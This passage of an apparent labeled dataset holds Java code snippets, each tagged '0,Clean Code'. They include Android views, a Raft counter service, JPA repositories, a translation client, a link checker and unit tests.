  }
  private void applyCheckState(  boolean animate){
    if (mDrawable != null) {
      mDrawable.flipTo(!mChecked);
      if (!animate) {
        mDrawable.reset();
      }
    }
  }
}
",0,Clean Code
"/** 
 * @author likun (saimu.msm@antfin.com)
 */
public class CounterServiceImpl implements CounterService {
  private static final Logger LOG=LoggerFactory.getLogger(CounterServiceImpl.class);
  private final CounterServer counterServer;
  private final Executor readIndexExecutor;
  public CounterServiceImpl(  CounterServer counterServer){
    this.counterServer=counterServer;
    this.readIndexExecutor=createReadIndexExecutor();
  }
  private Executor createReadIndexExecutor(){
    final StoreEngineOptions opts=new StoreEngineOptions();
    return StoreEngineHelper.createReadIndexExecutor(opts.getReadIndexCoreThreads());
  }
  @Override public void get(  final boolean readOnlySafe,  final CounterClosure closure){
    if (!readOnlySafe) {
      closure.success(getValue());
      closure.run(Status.OK());
      return;
    }
    this.counterServer.getNode().readIndex(BytesUtil.EMPTY_BYTES,new ReadIndexClosure(){
      @Override public void run(      Status status,      long index,      byte[] reqCtx){
        if (status.isOk()) {
          closure.success(getValue());
          closure.run(Status.OK());
          return;
        }
        CounterServiceImpl.this.readIndexExecutor.execute(() -> {
          if (isLeader()) {
            LOG.debug(""Fail to get value with 'ReadIndex': {}, try to applying to the state machine."",status);
            applyOperation(CounterOperation.createGet(),closure);
          }
 else {
            handlerNotLeaderError(closure);
          }
        }
);
      }
    }
);
  }
  private boolean isLeader(){
    return this.counterServer.getFsm().isLeader();
  }
  private long getValue(){
    return this.counterServer.getFsm().getValue();
  }
  private String getRedirect(){
    return this.counterServer.redirect().getRedirect();
  }
  @Override public void incrementAndGet(  final long delta,  final CounterClosure closure){
    applyOperation(CounterOperation.createIncrement(delta),closure);
  }
  private void applyOperation(  final CounterOperation op,  final CounterClosure closure){
    if (!isLeader()) {
      handlerNotLeaderError(closure);
      return;
    }
    try {
      closure.setCounterOperation(op);
      final Task task=new Task();
      task.setData(ByteBuffer.wrap(SerializerManager.getSerializer(SerializerManager.Hessian2).serialize(op)));
      task.setDone(closure);
      this.counterServer.getNode().apply(task);
    }
 catch (    CodecException e) {
      String errorMsg=""Fail to encode CounterOperation"";
      LOG.error(errorMsg,e);
      closure.failure(errorMsg,StringUtils.EMPTY);
      closure.run(new Status(RaftError.EINTERNAL,errorMsg));
    }
  }
  private void handlerNotLeaderError(  final CounterClosure closure){
    closure.failure(""Not leader."",getRedirect());
    closure.run(new Status(RaftError.EPERM,""Not leader""));
  }
}",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023-01-27
 */
public interface RoleRepository extends JpaRepository<Role,Long>, JpaSpecificationExecutor<Role> {
  /** 
 * 根据名称查询
 * @param name /
 * @return /
 */
  Role findByName(  String name);
  /** 
 * 删除多个角色
 * @param ids /
 */
  void deleteAllByIdIn(  Set<Long> ids);
  /** 
 * 根据用户ID查询
 * @param id 用户ID
 * @return /
 */
  @Query(value=""SELECT r.* FROM sys_role r, sys_users_roles u WHERE "" + ""r.role_id = u.role_id AND u.user_id = ?1"",nativeQuery=true) Set<Role> findByUserId(  Long id);
  /** 
 * 解绑角色菜单
 * @param id 菜单ID
 */
  @Modifying @Query(value=""delete from sys_roles_menus where menu_id = ?1"",nativeQuery=true) void untiedMenu(  Long id);
  /** 
 * 根据部门查询
 * @param deptIds /
 * @return /
 */
  @Query(value=""select count(1) from sys_role r, sys_roles_depts d where "" + ""r.role_id = d.role_id and d.dept_id in ?1"",nativeQuery=true) int countByDepts(  Set<Long> deptIds);
  /** 
 * 根据菜单Id查询
 * @param menuIds /
 * @return /
 */
  @Query(value=""SELECT r.* FROM sys_role r, sys_roles_menus m WHERE "" + ""r.role_id = m.role_id AND m.menu_id in ?1"",nativeQuery=true) List<Role> findInMenuId(  List<Long> menuIds);
}",0,Clean Code
"private static class FlingRunnable implements Runnable {
  private static final int SIXTY_FPS_INTERVAL=1000 / 60;
  private final OverScroller mScroller;
  private int mCurrentX, mCurrentY;
  private WeakReference<PhotoView> mPhotoViewWeakReference;
  FlingRunnable(  PhotoView photoView){
    mScroller=new OverScroller(photoView.getContext());
    mPhotoViewWeakReference=new WeakReference<>(photoView);
  }
  void cancelFling(){
    mScroller.forceFinished(true);
  }
  void fling(  int viewWidth,  int viewHeight,  int velocityX,  int velocityY){
    if (mPhotoViewWeakReference.get() == null) {
      return;
    }
    final RectF rect=mPhotoViewWeakReference.get().getDisplayRect();
    if (rect == null) {
      return;
    }
    final int startX=Math.round(-rect.left);
    final int minX, maxX, minY, maxY;
    if (viewWidth < rect.width()) {
      minX=0;
      maxX=Math.round(rect.width() - viewWidth);
    }
 else {
      minX=maxX=startX;
    }
    final int startY=Math.round(-rect.top);
    if (viewHeight < rect.height()) {
      minY=-Math.round(rect.height() - viewHeight);
      maxY=Math.round(rect.height() - viewHeight);
    }
 else {
      minY=Math.round(rect.height() - viewHeight);
      maxY=0;
    }
    mCurrentX=startX;
    mCurrentY=startY;
    if (startX != maxX || startY != maxY) {
      mScroller.fling(startX,startY,velocityX,velocityY,minX,maxX,minY,maxY,0,0);
    }
  }
  @Override public void run(){
    if (mScroller.isFinished() || mPhotoViewWeakReference.get() == null) {
      return;
    }
    if (mScroller.computeScrollOffset()) {
      final int newX=mScroller.getCurrX();
      final int newY=mScroller.getCurrY();
      mPhotoViewWeakReference.get().getScaleAndDragMatrix().postTranslate(mCurrentX - newX,mCurrentY - newY);
      mPhotoViewWeakReference.get().updateMatrix();
      mCurrentX=newX;
      mCurrentY=newY;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
        mPhotoViewWeakReference.get().postOnAnimation(this);
      }
 else {
        mPhotoViewWeakReference.get().postDelayed(this,SIXTY_FPS_INTERVAL);
      }
    }
  }
}
",0,Clean Code
"/** 
 * @version v2.3
 * @ClassName :AppStateService.java
 * @author : http://www.wgstart.com
 * @date : 2019年11月16日
 * @Description : AppStateService.java
 * @Copyright : 2017-2024 wgcloud. All rights reserved.
 */
@Service public class AppStateService {
  @Autowired private AppStateMapper appStateMapper;
  public PageInfo selectByParams(  Map<String,Object> params,  int currPage,  int pageSize) throws Exception {
    PageHelper.startPage(currPage,pageSize);
    List<AppState> list=appStateMapper.selectByParams(params);
    PageInfo<AppState> pageInfo=new PageInfo<AppState>(list);
    return pageInfo;
  }
  public void save(  AppState AppState) throws Exception {
    AppState.setId(UUIDUtil.getUUID());
    AppState.setCreateTime(DateUtil.getNowTime());
    AppState.setDateStr(DateUtil.getDateTimeString(AppState.getCreateTime()));
    appStateMapper.save(AppState);
  }
  public void saveRecord(  List<AppState> recordList) throws Exception {
    if (recordList.size() < 1) {
      return;
    }
    for (    AppState as : recordList) {
      as.setId(UUIDUtil.getUUID());
      as.setDateStr(DateUtil.getDateTimeString(as.getCreateTime()));
    }
    appStateMapper.insertList(recordList);
  }
  public int deleteByAppInfoId(  String appInfoId) throws Exception {
    return appStateMapper.deleteByAppInfoId(appInfoId);
  }
  public int deleteById(  String[] id) throws Exception {
    return appStateMapper.deleteById(id);
  }
  public AppState selectById(  String id) throws Exception {
    return appStateMapper.selectById(id);
  }
  public List<AppState> selectAllByParams(  Map<String,Object> params) throws Exception {
    return appStateMapper.selectAllByParams(params);
  }
}
",0,Clean Code
"public class ResponseOperateOrchestrator {
  private JobStatus jobStatus;
  private String message;
  public JobStatus getJobStatus(){
    return jobStatus;
  }
  public ResponseOperateOrchestrator setJobStatus(  JobStatus jobStatus){
    this.jobStatus=jobStatus;
    return this;
  }
  public String getMessage(){
    return message;
  }
  public ResponseOperateOrchestrator setMessage(  String message){
    this.message=message;
    return this;
  }
  public boolean isCompleted(){
    return isSucceed() || isFailed();
  }
  public boolean isSucceed(){
    return jobStatus == JobStatus.Success;
  }
  public boolean isFailed(){
    return jobStatus == JobStatus.Failed;
  }
  public boolean isRunning(){
    return jobStatus == JobStatus.Running;
  }
  public static ResponseOperateOrchestrator success(){
    ResponseOperateOrchestrator response=new ResponseOperateOrchestrator();
    response.setJobStatus(JobStatus.Success);
    return response;
  }
  public static ResponseOperateOrchestrator success(  String message){
    ResponseOperateOrchestrator response=new ResponseOperateOrchestrator();
    response.setJobStatus(JobStatus.Success);
    response.setMessage(message);
    return response;
  }
  public static ResponseOperateOrchestrator failed(  String message){
    ResponseOperateOrchestrator response=new ResponseOperateOrchestrator();
    response.setJobStatus(JobStatus.Failed);
    response.setMessage(message);
    return response;
  }
  public static ResponseOperateOrchestrator running(){
    ResponseOperateOrchestrator response=new ResponseOperateOrchestrator();
    response.setJobStatus(JobStatus.Running);
    return response;
  }
  public static ResponseOperateOrchestrator inited(){
    ResponseOperateOrchestrator response=new ResponseOperateOrchestrator();
    response.setJobStatus(JobStatus.Inited);
    return response;
  }
}
",0,Clean Code
"public class MySQLCommandSet extends AbstractCommandSet {
  public MySQLCommandSet(  Database db){
    super(db);
  }
  @Override @Language(""mysql"") public String createMapTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createCompressionTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createItemStorageTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createItemStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createGridStorageTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createGridStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String itemStorageWriteStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String itemStorageReadStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String itemStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String itemStorageHasStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageWriteStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageReadStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageHasStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageListStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStorageCountMapItemsStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String gridStoragePurgeMapStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String purgeMapStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String hasMapStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String listMapIdsStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String findMapKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createMapKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String findCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String findItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String findGridStorageKeyStatement(){
    return null;
  }
  @Override @Language(""mysql"") public String createGridStorageKeyStatement(){
    return null;
  }
}
",0,Clean Code
"/** 
 * 微软翻译
 * @author wangchao
 * @date 2023/04/08
 */
public class MicrosoftTranslator extends AbstractTranslator {
  private static final Logger LOGGER=Logger.getInstance(MicrosoftTranslator.class);
  private static final String EN2CH_URL=""https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&textType=plain&from=en&to=zh-Hans"";
  private static final String CH2EN_URL=""https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&textType=plain&from=zh-Hans&to=en"";
  @Override protected String translateCh2En(  String text){
    return translate(CH2EN_URL,text);
  }
  @Override protected String translateEn2Ch(  String text){
    return translate(EN2CH_URL,text);
  }
  private String translate(  String url,  String text){
    String json=null;
    try {
      JSONObject textObject=new JSONObject();
      textObject.put(""Text"",text);
      JSONArray body=new JSONArray();
      body.add(textObject);
      Map<String,String> headers=Maps.newHashMap();
      headers.put(""Ocp-Apim-Subscription-Key"",getConfig().getMicrosoftKey());
      if (StringUtils.isNotBlank(getConfig().getMicrosoftRegion())) {
        headers.put(""Ocp-Apim-Subscription-Region"",getConfig().getMicrosoftRegion());
      }
      json=HttpUtil.postJson(url,headers,JSON.toJSONString(body),getConfig().getTimeout());
      JSONArray response=JSON.parseArray(json);
      return Objects.requireNonNull(response).getJSONObject(0).getJSONArray(""translations"").getJSONObject(0).getString(""text"");
    }
 catch (    Exception e) {
      LOGGER.error(""microsoft translate error: please check your appkey and network,response="" + json,e);
      return StringUtils.EMPTY;
    }
  }
}",0,Clean Code
"/** 
 * Default implementation of the  {@link TypeConverter} interface,delegating to a core Spring  {@link ConversionService}.
 * @author Juergen Hoeller
 * @author Andy Clement
 * @see ConversionService
 * @since 3.0
 */
class StandardTypeConverter implements TypeConverter {
  private static ConversionService defaultConversionService;
  private final ConversionService conversionService;
  /** 
 * Create a StandardTypeConverter for the default ConversionService.
 */
  public StandardTypeConverter(){
synchronized (this) {
      if (defaultConversionService == null) {
        defaultConversionService=new DefaultConversionService();
      }
    }
    this.conversionService=defaultConversionService;
  }
  /** 
 * Create a StandardTypeConverter for the given ConversionService.
 * @param conversionService the ConversionService to delegate to
 */
  public StandardTypeConverter(  ConversionService conversionService){
    Assert.notNull(conversionService,""ConversionService must not be null"");
    this.conversionService=conversionService;
  }
  public boolean canConvert(  TypeDescriptor sourceType,  TypeDescriptor targetType){
    return this.conversionService.canConvert(sourceType,targetType);
  }
  public Object convertValue(  Object value,  TypeDescriptor sourceType,  TypeDescriptor targetType){
    try {
      return this.conversionService.convert(value,sourceType,targetType);
    }
 catch (    ConversionException ex) {
      throw new SpelEvaluationException(ex,SpelMessage.TYPE_CONVERSION_ERROR,sourceType.toString(),targetType.toString());
    }
  }
}
",0,Clean Code
"/** 
 * 数据源配置 Service 实现类
 * @author 芋道源码
 */
@Service @Validated public class DataSourceConfigServiceImpl implements DataSourceConfigService {
  @Resource private DataSourceConfigMapper dataSourceConfigMapper;
  @Resource private DynamicDataSourceProperties dynamicDataSourceProperties;
  @Override public Long createDataSourceConfig(  DataSourceConfigSaveReqVO createReqVO){
    DataSourceConfigDO config=BeanUtils.toBean(createReqVO,DataSourceConfigDO.class);
    validateConnectionOK(config);
    dataSourceConfigMapper.insert(config);
    return config.getId();
  }
  @Override public void updateDataSourceConfig(  DataSourceConfigSaveReqVO updateReqVO){
    validateDataSourceConfigExists(updateReqVO.getId());
    DataSourceConfigDO updateObj=BeanUtils.toBean(updateReqVO,DataSourceConfigDO.class);
    validateConnectionOK(updateObj);
    dataSourceConfigMapper.updateById(updateObj);
  }
  @Override public void deleteDataSourceConfig(  Long id){
    validateDataSourceConfigExists(id);
    dataSourceConfigMapper.deleteById(id);
  }
  private void validateDataSourceConfigExists(  Long id){
    if (dataSourceConfigMapper.selectById(id) == null) {
      throw exception(DATA_SOURCE_CONFIG_NOT_EXISTS);
    }
  }
  @Override public DataSourceConfigDO getDataSourceConfig(  Long id){
    if (Objects.equals(id,DataSourceConfigDO.ID_MASTER)) {
      return buildMasterDataSourceConfig();
    }
    return dataSourceConfigMapper.selectById(id);
  }
  @Override public List<DataSourceConfigDO> getDataSourceConfigList(){
    List<DataSourceConfigDO> result=dataSourceConfigMapper.selectList();
    result.add(0,buildMasterDataSourceConfig());
    return result;
  }
  private void validateConnectionOK(  DataSourceConfigDO config){
    boolean success=JdbcUtils.isConnectionOK(config.getUrl(),config.getUsername(),config.getPassword());
    if (!success) {
      throw exception(DATA_SOURCE_CONFIG_NOT_OK);
    }
  }
  private DataSourceConfigDO buildMasterDataSourceConfig(){
    String primary=dynamicDataSourceProperties.getPrimary();
    DataSourceProperty dataSourceProperty=dynamicDataSourceProperties.getDatasource().get(primary);
    return new DataSourceConfigDO().setId(DataSourceConfigDO.ID_MASTER).setName(primary).setUrl(dataSourceProperty.getUrl()).setUsername(dataSourceProperty.getUsername()).setPassword(dataSourceProperty.getPassword());
  }
}
",0,Clean Code
"/** 
 * 文件上传
 * @author 作者 owen E-mail: 624191343@qq.com
 */
@RestController public class FileController {
  @Resource private IFileService fileService;
  /** 
 * 文件上传 根据fileType选择上传方式
 * @param file
 * @return
 * @throws Exception
 */
  @PostMapping(""/files-anon"") public FileInfo upload(  @RequestParam(""file"") MultipartFile file) throws Exception {
    return fileService.upload(file);
  }
  /** 
 * 文件删除
 * @param id
 */
  @DeleteMapping(""/files/{id}"") public Result delete(  @PathVariable String id){
    try {
      fileService.delete(id);
      return Result.succeed(""操作成功"");
    }
 catch (    Exception ex) {
      return Result.failed(""操作失败"");
    }
  }
  /** 
 * 文件查询
 * @param params
 * @return
 */
  @GetMapping(""/files"") public PageResult<FileInfo> findFiles(  @RequestParam Map<String,Object> params){
    return fileService.findList(params);
  }
}
",0,Clean Code
"/** 
 * Framebuffer to render to a map
 */
public interface Framebuffer {
  int WIDTH=128;
  int HEIGHT=128;
  byte[] toMapColors();
  default MapDataPacket preparePacket(  int mapId){
    return preparePacket(mapId,0,0,WIDTH,HEIGHT);
  }
  default MapDataPacket preparePacket(  int mapId,  int minX,  int minY,  int width,  int height){
    byte[] colors;
    if (minX == 0 && minY == 0 && width == WIDTH && height == HEIGHT) {
      colors=toMapColors();
    }
 else {
      colors=new byte[width * height];
      final byte[] mapColors=toMapColors();
      for (int y=minY; y < Math.min(HEIGHT,minY + height); y++) {
        for (int x=minX; x < Math.min(WIDTH,minX + width); x++) {
          byte color=mapColors[index(x,y,WIDTH)];
          colors[index(x - minX,y - minY,width)]=color;
        }
      }
    }
    return new MapDataPacket(mapId,(byte)0,false,false,List.of(),new MapDataPacket.ColorContent((byte)width,(byte)height,(byte)minX,(byte)minY,colors));
  }
  static int index(  int x,  int z){
    return index(x,z,WIDTH);
  }
  static int index(  int x,  int z,  int stride){
    return z * stride + x;
  }
}
",0,Clean Code
"public class ContextPostActionBuilder {
  private final DefaultContextPostAction action;
  private Map<String,Object> requestParams=new HashMap<String,Object>(4);
  private Map<String,String> headerParams=new HashMap<>(2);
  public ContextPostActionBuilder(  String url){
    action=new DefaultContextPostAction(url);
  }
  public static ContextPostActionBuilder of(  String url){
    return new ContextPostActionBuilder(url);
  }
  public ContextPostActionBuilder with(  ContextID contextID) throws ErrorException {
    String contextIDStr=SerializeHelper.serializeContextID(contextID);
    requestParams.put(ContextHTTPConstant.CONTEXT_ID_STR,contextIDStr);
    return this;
  }
  public ContextPostActionBuilder with(  ContextHistory history) throws ErrorException {
    String historyStr=SerializeHelper.serializeContextHistory(history);
    requestParams.put(ContextHTTPConstant.CONTEXT_HISTORY_KEY,historyStr);
    return this;
  }
  public ContextPostActionBuilder with(  String key,  Object object) throws ErrorException {
    requestParams.put(key,object);
    return this;
  }
  public ContextPostActionBuilder addHeader(  String key,  String value) throws ErrorException {
    headerParams.put(key,value);
    return this;
  }
  public DefaultContextPostAction build(){
    action.getRequestPayloads().putAll(requestParams);
    action.getHeaders().putAll(headerParams);
    return action;
  }
}",0,Clean Code
"/** 
 * Link accessibility check task.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Jan 1, 2018
 * @since 2.2.0
 */
private class CheckTask implements Runnable {
  /** 
 * Link to check.
 */
  private final JSONObject link;
  /** 
 * Count down latch.
 */
  private final CountDownLatch countDownLatch;
  /** 
 * Constructs a check task with the specified link.
 * @param link           the specified link
 * @param countDownLatch the specified count down latch
 */
  public CheckTask(  final JSONObject link,  final CountDownLatch countDownLatch){
    this.link=link;
    this.countDownLatch=countDownLatch;
  }
  @Override public void run(){
    final String linkAddr=link.optString(Link.LINK_ADDR);
    final long start=System.currentTimeMillis();
    int responseCode=0;
    try {
      final int TIMEOUT=5000;
      final HttpResponse response=HttpRequest.get(linkAddr).timeout(TIMEOUT).followRedirects(true).header(Common.USER_AGENT,Symphonys.USER_AGENT_BOT).send();
      responseCode=response.statusCode();
    }
 catch (    final Exception e) {
      LOGGER.trace(""Link [url="" + linkAddr + ""] accessibility check failed [msg=""+ e.getMessage()+ ""]"");
    }
 finally {
      countDownLatch.countDown();
      final long elapsed=System.currentTimeMillis() - start;
      LOGGER.log(Level.TRACE,""Accesses link [url="" + linkAddr + ""] response [code=""+ responseCode+ ""], ""+ ""elapsed [""+ elapsed+ ""]"");
      link.put(Link.LINK_PING_CNT,link.optInt(Link.LINK_PING_CNT) + 1);
      if (200 != responseCode) {
        link.put(Link.LINK_PING_ERR_CNT,link.optInt(Link.LINK_PING_ERR_CNT) + 1);
      }
      link.put(Link.LINK_PING_TIME,System.currentTimeMillis());
      final Transaction transaction=linkRepository.beginTransaction();
      try {
        linkRepository.update(link.optString(Keys.OBJECT_ID),link);
        transaction.commit();
      }
 catch (      final RepositoryException e) {
        if (null != transaction && transaction.isActive()) {
          transaction.rollback();
        }
        LOGGER.log(Level.ERROR,""Updates link failed"",e);
      }
    }
  }
}
",0,Clean Code
"@jakarta.annotation.Generated(value=""org.springdoc.demo.app2.codegen.languages.SpringCodegen"",date=""2019-07-11T00:09:29.839+02:00[Europe/Paris]"") @Controller @RequestMapping(""${openapi.openAPIPetstore.base-path:/}"") public class PetApiController implements PetApi {
  private final PetApiDelegate delegate;
  public PetApiController(  @org.springframework.beans.factory.annotation.Autowired(required=false) PetApiDelegate delegate){
    this.delegate=Optional.ofNullable(delegate).orElse(new PetApiDelegate(){
    }
);
  }
  @Override public PetApiDelegate getDelegate(){
    return delegate;
  }
}
/** 
 * The type Pet api controller.
 */
@jakarta.annotation.Generated(value=""org.springdoc.demo.app2.codegen.languages.SpringCodegen"",date=""2019-07-11T00:09:29.839+02:00[Europe/Paris]"") @Controller @RequestMapping(""${openapi.openAPIPetstore.base-path:/}"") class PetApiController implements PetApi {
  /** 
 * The Delegate.
 */
  private final PetApiDelegate delegate;
  /** 
 * Instantiates a new Pet api controller.
 * @param delegate the delegate
 */
  public PetApiController(  @org.springframework.beans.factory.annotation.Autowired(required=false) PetApiDelegate delegate){
    this.delegate=Optional.ofNullable(delegate).orElse(new PetApiDelegate(){
    }
);
  }
  /** 
 * Gets delegate.
 * @return the delegate
 */
  @Override public PetApiDelegate getDelegate(){
    return delegate;
  }
}
",0,Clean Code
"public class PrebuiltFeatureShortcutActivity extends Activity {
  private static final String KEY_FEATURE_ID=""key_feature_id"";
  public static Intent createIntent(  Context context,  int featureId){
    XLog.d(""PrebuiltFeatureShortcutActivity, createIntent: "" + featureId);
    Intent intent=new Intent(context,PrebuiltFeatureShortcutActivity.class);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    intent.putExtra(KEY_FEATURE_ID,featureId);
    return intent;
  }
  @Override protected void onCreate(  @Nullable Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    int featId=getIntent().getIntExtra(KEY_FEATURE_ID,Integer.MIN_VALUE);
    XLog.d(""PrebuiltFeatureShortcutActivity, featId: "" + featId);
    if (PrebuiltFeatureIds.INSTANCE.isValidId(featId)) {
      new PrebuiltFeatureLauncher(this,() -> null).launch(featId);
    }
    finish();
  }
public static class ShortcutHelper {
    public static void addShortcut(    Context context,    FeatureItem tile){
      if (ShortcutManagerCompat.isRequestPinShortcutSupported(context)) {
        Drawable drawable=ResourcesCompat.getDrawable(context.getResources(),tile.getPackedIconRes(),null);
        LayerDrawable ld=(LayerDrawable)drawable;
        Drawable layer=ld.findDrawableByLayerId(R.id.settings_ic_foreground);
        if (layer != null) {
          layer.setTint(ContextCompat.getColor(context,tile.getThemeColor()));
          ld.setDrawableByLayerId(R.id.settings_ic_foreground,layer);
        }
        Bitmap resource=BitmapUtil.getBitmap(context,drawable);
        Intent shortcutInfoIntent=PrebuiltFeatureShortcutActivity.createIntent(context,tile.getId());
        shortcutInfoIntent.setAction(Intent.ACTION_VIEW);
        ShortcutInfoCompat info=new ShortcutInfoCompat.Builder(context,""Shortcut-of-thanox-for-feature-"" + tile.getId()).setIcon(IconCompat.createWithBitmap(Objects.requireNonNull(resource))).setShortLabel(context.getString(tile.getTitleRes())).setIntent(shortcutInfoIntent).build();
        ShortcutManagerCompat.requestPinShortcut(context,info,ShortcutReceiver.getPinRequestAcceptedIntent(context).getIntentSender());
      }
    }
  }
}
",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2019/3/13 17:19
 */
public class PidByPsHandler extends AbstractPidHandler implements PidHandler {
  private static final Logger logger=LoggerFactory.getLogger(PidByPsHandler.class);
  private static final MetaStore META_STORE=MetaStores.getMetaStore();
  private static final String TOMCAT_USER=META_STORE.getStringProperty(""tomcat.user"",""tomcat"");
  private static final String TOMCAT_COMMAND=META_STORE.getStringProperty(""tomcat.command"",""/home/java/default/bin/java"");
  private static final int USER_INDEX=0;
  private static final int PID_INDEX=1;
  private static final int COMMAND_INDEX=10;
  @Override public int priority(){
    return Priority.FROM_PS_PRIORITY;
  }
  @Override protected int doGetPid(){
    String psInfo=getPsInfo();
    if (!Strings.isNullOrEmpty(psInfo)) {
      ArrayListMultimap<String,PsInfo> multimap=parsePsInfo(psInfo);
      List<PsInfo> infos=multimap.get(TOMCAT_COMMAND);
      if (infos != null && infos.size() > 0) {
        for (        PsInfo info : infos) {
          if (TOMCAT_USER.equalsIgnoreCase(info.getUser())) {
            return info.getPid();
          }
        }
      }
    }
    return -1;
  }
  private static ArrayListMultimap<String,PsInfo> parsePsInfo(  final String psInfo){
    ArrayListMultimap<String,PsInfo> multimap=ArrayListMultimap.create();
    String all=psInfo.replaceAll(""[( )\t]+"","" "");
    String[] lines=all.split(""[\n\r(\r\n)]"");
    for (    String line : lines) {
      if (Strings.isNullOrEmpty(line)) {
        continue;
      }
      String[] pieces=line.split("" "");
      final String user=pieces[USER_INDEX];
      final int pid=Integer.parseInt(pieces[PID_INDEX]);
      final String command=pieces[COMMAND_INDEX];
      final String[] params=Arrays.copyOfRange(pieces,COMMAND_INDEX + 1,pieces.length);
      PsInfo process=new PsInfo(user,pid,command,params);
      multimap.put(command,process);
    }
    return multimap;
  }
  private static String getPsInfo(){
    ByteArrayOutputStream outputStream=new ByteArrayOutputStream();
    try (ClosableProcess process=ClosableProcesses.wrap(new ProcessBuilder(""/bin/sh"",""-c"",""ps aux | grep java"").redirectErrorStream(true).start());InputStream inputStream=process.getInputStream()){
      ByteStreams.copy(inputStream,outputStream);
      return outputStream.toString(""utf8"");
    }
 catch (    Exception e) {
      logger.error(""execute ps aux|grep java error"",e);
      return null;
    }
  }
}
",0,Clean Code
"class AccountTest {
  @Test void calculatesBalance(){
    AccountId accountId=new AccountId(1L);
    Account account=defaultAccount().withAccountId(accountId).withBaselineBalance(Money.of(555L)).withActivityWindow(new ActivityWindow(defaultActivity().withTargetAccount(accountId).withMoney(Money.of(999L)).build(),defaultActivity().withTargetAccount(accountId).withMoney(Money.of(1L)).build())).build();
    Money balance=account.calculateBalance();
    assertThat(balance).isEqualTo(Money.of(1555L));
  }
  @Test void withdrawalSucceeds(){
    AccountId accountId=new AccountId(1L);
    Account account=defaultAccount().withAccountId(accountId).withBaselineBalance(Money.of(555L)).withActivityWindow(new ActivityWindow(defaultActivity().withTargetAccount(accountId).withMoney(Money.of(999L)).build(),defaultActivity().withTargetAccount(accountId).withMoney(Money.of(1L)).build())).build();
    AccountId randomTargetAccount=new AccountId(99L);
    boolean success=account.withdraw(Money.of(555L),randomTargetAccount);
    assertThat(success).isTrue();
    assertThat(account.getActivityWindow().getActivities()).hasSize(3);
    assertThat(account.calculateBalance()).isEqualTo(Money.of(1000L));
  }
  @Test void withdrawalFailure(){
    AccountId accountId=new AccountId(1L);
    Account account=defaultAccount().withAccountId(accountId).withBaselineBalance(Money.of(555L)).withActivityWindow(new ActivityWindow(defaultActivity().withTargetAccount(accountId).withMoney(Money.of(999L)).build(),defaultActivity().withTargetAccount(accountId).withMoney(Money.of(1L)).build())).build();
    boolean success=account.withdraw(Money.of(1556L),new AccountId(99L));
    assertThat(success).isFalse();
    assertThat(account.getActivityWindow().getActivities()).hasSize(2);
    assertThat(account.calculateBalance()).isEqualTo(Money.of(1555L));
  }
  @Test void depositSuccess(){
    AccountId accountId=new AccountId(1L);
    Account account=defaultAccount().withAccountId(accountId).withBaselineBalance(Money.of(555L)).withActivityWindow(new ActivityWindow(defaultActivity().withTargetAccount(accountId).withMoney(Money.of(999L)).build(),defaultActivity().withTargetAccount(accountId).withMoney(Money.of(1L)).build())).build();
    boolean success=account.deposit(Money.of(445L),new AccountId(99L));
    assertThat(success).isTrue();
    assertThat(account.getActivityWindow().getActivities()).hasSize(3);
    assertThat(account.calculateBalance()).isEqualTo(Money.of(2000L));
  }
}
",0,Clean Code
"public class SetConferenceTypeView extends BottomSheetDialog implements View.OnClickListener {
  private Button mButtonCancel;
  private Button mButtonFreeToSpeak;
  private Button mButtonRaiseHand;
  private SeatEnableCallback mSeatEnableCallback;
public interface SeatEnableCallback {
    void onSeatEnableChanged(    boolean enable);
  }
  public void setSeatEnableCallback(  SeatEnableCallback callback){
    mSeatEnableCallback=callback;
  }
  public SetConferenceTypeView(  @NonNull Context context){
    super(context,R.style.TUIRoomDialogFragmentTheme);
    setContentView(R.layout.tuiroomkit_view_conference_type_select);
    initView();
  }
  private void initView(){
    mButtonCancel=findViewById(R.id.btn_cancel_select);
    mButtonFreeToSpeak=findViewById(R.id.btn_free_speech);
    mButtonRaiseHand=findViewById(R.id.btn_raise_hand);
    mButtonCancel.setOnClickListener(this);
    mButtonFreeToSpeak.setOnClickListener(this);
    mButtonRaiseHand.setOnClickListener(this);
  }
  @Override public void onClick(  View v){
    if (v.getId() == R.id.btn_cancel_select) {
      dismiss();
    }
 else     if (v.getId() == R.id.btn_free_speech) {
      setConferenceType(false);
    }
 else     if (v.getId() == R.id.btn_raise_hand) {
      setConferenceType(true);
    }
  }
  private void setConferenceType(  boolean isSeatEnabled){
    if (mSeatEnableCallback != null) {
      mSeatEnableCallback.onSeatEnableChanged(isSeatEnabled);
    }
    dismiss();
  }
}
